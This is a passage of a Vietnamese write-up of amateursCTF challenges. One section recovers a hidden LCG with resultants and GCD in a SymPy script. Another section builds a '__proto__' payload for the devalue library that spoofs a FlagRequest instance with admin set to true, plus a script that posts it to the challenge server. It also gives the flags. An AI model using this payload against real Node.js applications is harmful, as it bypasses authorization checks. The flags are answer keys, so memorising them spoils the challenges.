*   **Output $i$ ($x_i$):** Tổng số bước là dãy số tam giác (Triangular Number): $N_i = \frac{i(i+1)}{2}$.

Chúng ta có 6 output ($x_1, \dots, x_6$) nhưng không biết $m, a, c$ và `flag`.

#### Mô hình hóa toán học

##### Công thức LCG tổng quát
Công thức cập nhật trạng thái của LCG là:
$$S_{k} = (a \cdot S_{k-1} + c) \pmod m$$

Sau $n$ bước, trạng thái $S_n$ được tính từ trạng thái đầu $S_0$ theo công thức:
$$S_n = a^n S_0 + c \frac{a^n - 1}{a - 1} \pmod m$$

Công thức này khá cồng kềnh vì chứa phép cộng. Để đơn giản hóa, ta sử dụng kỹ thuật **Affine Shift** (Dịch chuyển affine) để đưa về dạng cấp số nhân thuần túy.

##### Kỹ thuật Affine Shift
Ta tìm một số $u$ sao cho dãy số $y_n = S_n + u$ tuân theo quy luật $y_n = a^k \cdot y_0$.
Đặt $S_{next} + u = a(S_{curr} + u)$.
Triển khai ra:
$$S_{next} = a \cdot S_{curr} + a \cdot u - u$$
So sánh với phương trình gốc $S_{next} = a \cdot S_{curr} + c$, ta có:
$$c = u(a - 1) \implies u = c(a - 1)^{-1} \pmod m$$

Khi đó, trạng thái tại bước thứ $k$ có thể viết gọn là:
$$x + u = a^k (S_0 + u) \pmod m$$

##### Áp dụng vào bài toán
Gọi $x_1, x_2, x_3, \dots$ là các giá trị nhận được (outputs).
Gọi $k_i$ là tổng số bước nhảy tương ứng. Ta có:
1.  $x_1 + u = a^1 (S_0 + u)$
2.  $x_2 + u = a^3 (S_0 + u)$
3.  $x_3 + u = a^6 (S_0 + u)$
4.  $x_4 + u = a^{10} (S_0 + u)$

#### Xây dựng phương trình loại bỏ ẩn số

Hiện tại ta có quá nhiều ẩn ($a, S_0, m, u$). Ta sẽ tìm cách loại bỏ $S_0$ và $a$ để tìm $u$ và $m$.

##### Bước 1: Loại bỏ cụm $(S_0 + u)$
Ta xét tỷ lệ giữa các output liên tiếp (đã cộng $u$):

$$\frac{x_2 + u}{x_1 + u} = \frac{a^3(S_0+u)}{a^1(S_0+u)} = a^2$$
$$\frac{x_3 + u}{x_2 + u} = \frac{a^6(S_0+u)}{a^3(S_0+u)} = a^3$$
$$\frac{x_4 + u}{x_3 + u} = \frac{a^{10}(S_0+u)}{a^6(S_0+u)} = a^4$$

##### Bước 2: Loại bỏ $a$
Ta có mối quan hệ giữa các lũy thừa của $a$:
$$(a^2)^3 = (a^3)^2$$
Thay thế các tỷ lệ vào:
$$\left( \frac{x_2 + u}{x_1 + u} \right)^3 \equiv \left( \frac{x_3 + u}{x_2 + u} \right)^2 \pmod m$$

Nhân chéo để khử mẫu số:
$$(x_2 + u)^3 (x_2 + u)^2 - (x_3 + u)^2 (x_1 + u)^3 \equiv 0 \pmod m$$
$$(x_2 + u)^5 - (x_1 + u)^3 (x_3 + u)^2 \equiv 0 \pmod m$$

Đặt đa thức này là $P_2(u)$. Đây là một đa thức biến $u$, bậc 5.

Tương tự, ta thiết lập quan hệ giữa $a^3$ và $a^4$ (từ bộ $x_2, x_3, x_4$):
$$(a^3)^4 = (a^4)^3 \implies \left( \frac{x_3 + u}{x_2 + u} \right)^4 \equiv \left( \frac{x_4 + u}{x_3 + u} \right)^3 \pmod m$$
$$(x_3 + u)^7 - (x_4 + u)^3 (x_2 + u)^4 \equiv 0 \pmod m$$

Đặt đa thức này là $P_3(u)$.

#### Khôi phục module $m$ và $u$

##### Tìm $m$ (Modulus Recovery)
Ta có hai đa thức $P_2(u)$ và $P_3(u)$. Chúng có cùng một nghiệm $u$ thực sự trong trường $\mathbb{Z}_m$.
Theo tính chất đại số:
> Nếu hai đa thức có nghiệm chung, thì **Hợp thức (Resultant)** của chúng phải bằng 0 (hoặc trong trường hợp này là chia hết cho $m$).

Ta tính:
*   $R_{23} = \text{Resultant}(P_2(u), P_3(u))$
*   $R_{34} = \text{Resultant}(P_3(u), P_4(u))$ (Dùng thêm bộ $x_3, x_4, x_5$ để chắc chắn).

Số $m$ phải là ước chung của các Resultant này.
$$m = \text{GCD}(R_{23}, R_{34})$$

*Lưu ý thực tế:* GCD tìm được thường là một số rất lớn và có thể là bội số của số nguyên tố $m$ cần tìm (ví dụ: $k \cdot m \cdot 2^{100} \dots$). Ta cần chia cho các thừa số nhỏ (2, 3, 5...) để lọc ra số nguyên tố $m$.

##### Tìm $u$
Sau khi đã biết $m$, ta quay lại giải hệ phương trình đa thức trên vành $\mathbb{Z}_m$.
Nghiệm $u$ chính là nghiệm chung của $P_2(u)$ và $P_3(u) \pmod m$.
Ta tìm ước chung lớn nhất của hai đa thức (Polynomial GCD):
$$G(u) = \text{GCD}(P_2(u), P_3(u)) \pmod m$$

Kết quả $G(u)$ thường sẽ là một nhị thức bậc nhất dạng $A \cdot u + B$.
Nghiệm là:
$$u \equiv -B \cdot A^{-1} \pmod m$$

#### Khôi phục Flag

Sau khi có $m$ và $u$, mọi thứ trở nên đơn giản:

1.  **Tính $a$:**
    Ta đã biết $a^2 = \frac{x_2+u}{x_1+u}$ và $a^3 = \frac{x_3+u}{x_2+u}$.
    $$a = a^3 \cdot (a^2)^{-1} \pmod m$$

2.  **Tính $c$:**
    Từ công thức chuyển đổi $u = c(a-1)^{-1}$, ta suy ra:
    $$c = u(a - 1) \pmod m$$

3.  **Tính $S_0$ (Flag):**
    Ta có $x_1$ là trạng thái sau 1 bước nhảy từ $S_0$:
    $$x_1 = a \cdot S_0 + c \pmod m$$
    Suy ra:
    $$S_0 = (x_1 - c) \cdot a^{-1} \pmod m$$

4.  **Decode:** Chuyển số nguyên $S_0$ thành bytes để lấy flag.

5.  **Script**

```python
import sys
sys.setrecursionlimit(2000)

from sympy import symbols, Poly, gcd
from Crypto.Util.number import long_to_bytes, inverse, isPrime

outputs = [
    1471207943545852478106618608447716459893047706734102352763789322304413594294954078951854930241394509747415,
    1598692736073482992170952603470306867921209728727115430390864029776876148087638761351349854291345381739153,
    7263027854980708582516705896838975362413360736887495919458129587084263748979742208194554859835570092536173,
    1421793811298953348672614691847135074360107904034360298926919347912881575026291936258693160494676689549954,
    7461500488401740536173753018264993398650307817555091262529778478859878439497126612121005384358955488744365,
    7993378969370214846258034508475124464164228761748258400865971489460388035990421363365750583336003815658573
]

def solve():
    print("[*] Building polynomials...")
    u = symbols('u')
    
    # P2 corresponding to i=2
    x1, x2, x3 = outputs[0], outputs[1], outputs[2]
    P2 = (x2 + u)**5 - (x1 + u)**3 * (x3 + u)**2
    
    # P3 corresponding to i=3
    x2, x3, x4 = outputs[1], outputs[2], outputs[3]
    P3 = (x3 + u)**7 - (x2 + u)**4 * (x4 + u)**3
    
    # P4 corresponding to i=4
    x3, x4, x5 = outputs[2], outputs[3], outputs[4]
    P4 = (x4 + u)**9 - (x3 + u)**5 * (x5 + u)**4

    poly2 = Poly(P2, u)
    poly3 = Poly(P3, u)
    poly4 = Poly(P4, u)

    print("[*] Calculating Resultants...")
    res23 = poly2.resultant(poly3)
    res34 = poly3.resultant(poly4)

    print("[*] Finding GCD to recover m...")
    # The resultants return a very large number that is a multiple of m
    m_sympy = gcd(res23, res34)
    
    m = int(m_sympy)
    
    print(f"[+] Raw GCD (bit length): {m.bit_length()}")

    # Filter out small factors (2, 3, 5...) to get the prime m
    print("[*] Finding small factors to filter out...")
    for factor in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]:
        while m % factor == 0:
            m //= factor
            
    if isPrime(m):
        print(f"[+] Found m (Prime): {m}")
    else:
        print(f"[!] WARNING: m is not prime (isPrime=False).")
        print(f"    Value of m: {m}")
        # Still try to proceed in case isPrime check is wrong or m is a special composite (though the problem states getPrime)
    print("[*] Finding u in the field Z_m...")
    
    # Convert polynomials to Z_m using set_modulus (accepts standard int)
    P2_mod = poly2.set_modulus(m)
    P3_mod = poly3.set_modulus(m)
    
    # Calculate GCD of polynomials over Z_m
    # This GCD will be linear: a*u + b
    G = gcd(P2_mod, P3_mod)
    
    if G.degree() < 1:
        print("[-] Could not find u (GCD polynomial is constant).")
        return

    # Get coefficients to solve the linear equation: coeff_1 * u + coeff_0 = 0
    coeffs = G.all_coeffs() # [coeff_1, coeff_0]
    a_coef = int(coeffs[0])
    b_coef = int(coeffs[1])
    
    # u = -b * a^-1 mod m
    u_val = (-b_coef * inverse(a_coef, m)) % m
    print(f"[+] Found u: {u_val}")

    # Recover a
    # a^2 = (x2+u)/(x1+u)
    # a^3 = (x3+u)/(x2+u)
    # a = a^3 * (a^2)^-1
    val_a2 = ((outputs[1] + u_val) * inverse(outputs[0] + u_val, m)) % m
    val_a3 = ((outputs[2] + u_val) * inverse(outputs[1] + u_val, m)) % m
    
    a_val = (val_a3 * inverse(val_a2, m)) % m
    print(f"[+] Found a: {a_val}")
    
    # Recover c
    # u = c(a-1)^-1 => c = u(a-1)
    c_val = (u_val * (a_val - 1)) % m
    print(f"[+] Found c: {c_val}")
    
    # Recover Flag
    # x1 = (a * flag + c) mod m => flag = (x1 - c) * a^-1
    flag_int = ((outputs[0] - c_val) * inverse(a_val, m)) % m
    
    try:
        flag = long_to_bytes(flag_int)
        print(f"\nFlag: {flag.decode()}")
    except Exception as e:
        print(f"\nFlag (int): {flag_int}")
        print(f"Decode error: {e}")

if __name__ == "__main__":
    solve()
```

> Flag: `amateursCTF{w0w_such_cr3ativ3_lcG_ch4ll3ngE}`
{: .prompt-flag }

#### Summary

1.  **Input:** Lấy 6 số output từ đề bài.
2.  **SymPy Poly:** Tạo các đa thức $P_i(u)$ bằng thư viện SymPy.
3.  **Resultant:** Tính Resultant của các cặp đa thức để loại bỏ $u$.
4.  **GCD Integer:** Tính GCD của các Resultant để tìm bội của $m$. Lọc các thừa số nhỏ để lấy $m$ nguyên tố.
5.  **Poly GCD Mod $m$:** Tính GCD của các đa thức trên trường $\mathbb{Z}_m$ để tìm phương trình bậc nhất chứa $u$. Giải tìm $u$.
6.  **Backtrack:** Tính ngược lại $a \to c \to \text{flag}$.

#### Key Takeaways
*   **LCG không an toàn:** Ngay cả khi ẩn số lần lặp hay mô-đun, LCG vẫn dễ bị tấn công nếu lộ ra một vài output liên tiếp do tính chất tuyến tính của nó.
*   **Affine Shift:** Kỹ thuật thêm hằng số $u$ để biến đổi $ax+c$ thành phép nhân $a(x+u)$ là cực kỳ hữu ích trong việc giải các bài toán LCG ẩn tham số.
*   **Resultant:** Là công cụ mạnh mẽ trong mật mã học (đặc biệt là tấn công RSA kiểu Franklin-Reiter) để loại bỏ biến chung giữa hai phương trình đa thức mà không cần giải trực tiếp.


## **Web**
### **desafe**

#### Analysis

**Source Code:**
- Server được viết bằng Node.js sử dụng framework `Hono`.
- Sử dụng thư viện `devalue` (v5.3.0) để parse input từ body request.
- Class `FlagRequest`:
  ```javascript
  class FlagRequest {
    constructor(feedback) {
      delete { feedback } // Không làm gì cả
    }
    get flag() {
      if (this.admin) { // Điều kiện để lấy cờ
        return FLAG;
      } else {
        return "haha nope"
      }
    }
  }
  ```
- Endpoint `POST /`:
  - Nhận input dạng text.
  - Parse input bằng `devalue.parse` với custom reducer cho `FlagRequest`.
  - Kiểm tra `instanceof FlagRequest`.
  - Trả về `flagRequest.flag`.

**Vấn đề:**
- Class `FlagRequest` không có cách nào set `this.admin = true` thông qua constructor.
- Chúng ta cần thao tác vào dữ liệu đầu vào để khi `devalue` deserialize, object kết quả sẽ có thuộc tính `admin: true`.

**Lỗ hổng:**
- Thư viện `devalue` cho phép tái tạo object phức tạp thông qua cấu trúc mảng. Nếu kiểm soát được cấu trúc này, ta có thể tấn công **Prototype Pollution** hoặc **Object Spoofing** bằng cách chèn key `__proto__`.

---

#### Exploit Strategy

##### Vượt qua `JSON.stringify`
Một cạm bẫy lớn ở bài này là nếu dùng `JSON.stringify({"__proto__": ...})` trong JS client để tạo payload, thuộc tính `__proto__` sẽ bị **loại bỏ** tự động. Do đó, Payload phải được viết thủ công dưới dạng **String** (chuỗi thô).

##### Kỹ thuật "Fake Instance" (Giả mạo đối tượng)
Thay vì cố gắng làm ô nhiễm `Object.prototype` (gây crash server hoặc không ổn định), ta sẽ tạo ra một Object giả mạo có cấu trúc đặc biệt:

1.  **Object giả (Target):** Ta tự tạo một object có `admin: true`.
2.  **Prototype Hijacking:** Ta set `__proto__` của Object giả này trỏ tới một instance hợp lệ của `FlagRequest`.

**Kết quả:**
- Khi server kiểm tra `object instanceof FlagRequest`: Nó nhìn vào prototype chain -> Thấy `FlagRequest` -> **Hợp lệ (Pass)**.
- Khi server gọi `object.flag`: Getter `flag` được gọi từ prototype (FlagRequest), nhưng `this` lúc này trỏ vào Object giả của ta.
- Khi getter check `this.admin`: Nó tìm thấy `admin: true` trên Object giả -> **Trả về Flag**.

---

#### Payload

Cấu trúc dữ liệu của `devalue` là một mảng, trong đó các phần tử tham chiếu lẫn nhau qua index.

**Payload:**
```json
[{"admin":2,"__proto__":1},["FlagRequest",3],true,[4],{}]
```

**Giải thích từng index:**

*   **Index 0:** `{"admin":2, "__proto__":1}`
    *   Đây là object kết quả server nhận được.
    *   `admin`: trỏ tới Index 2 (giá trị `true`).
    *   `__proto__`: trỏ tới Index 1 (Instance thật).
*   **Index 1:** `["FlagRequest",3]`
    *   Đây là cú pháp của `devalue` để tạo một instance của class `FlagRequest`.
    *   Tham số khởi tạo lấy từ Index 3.
*   **Index 2:** `true`
    *   Giá trị boolean `true` cho thuộc tính admin.
*   **Index 3:** `[4]`
    *   Mảng chứa tham số cho constructor `FlagRequest` (vì constructor nhận vào `feedback`).
*   **Index 4:** `{}`
    *   Object rỗng (giá trị của feedback), không quan trọng lắm.

---

#### Script Exploit

Lưu file `solve.js` và chạy bằng `node solve.js`.

```javascript
const payload = '[{"admin":2,"__proto__":1},["FlagRequest",3],true,[4],{}]';

console.log("Sending Payload:", payload);

fetch('https://web-desafe-nchq441e.amt.rs/', {
    method: 'POST',
    headers: {
        'Content-Type': 'text/plain'
    },
    body: payload
})
.then(async res => {
    console.log("Status:", res.status);
    const text = await res.text();
    console.log("Response:", text);
})
.catch(err => console.error("Error:", err));
```

> Flag: `amateursCTF{i_love_you_rich_harris}`
{: .prompt-flag }

--- 
*Note: Bài này dạy chúng ta về việc `JSON.stringify` không an toàn để craft payload prototype pollution và cách `devalue` xử lý object hydration.*
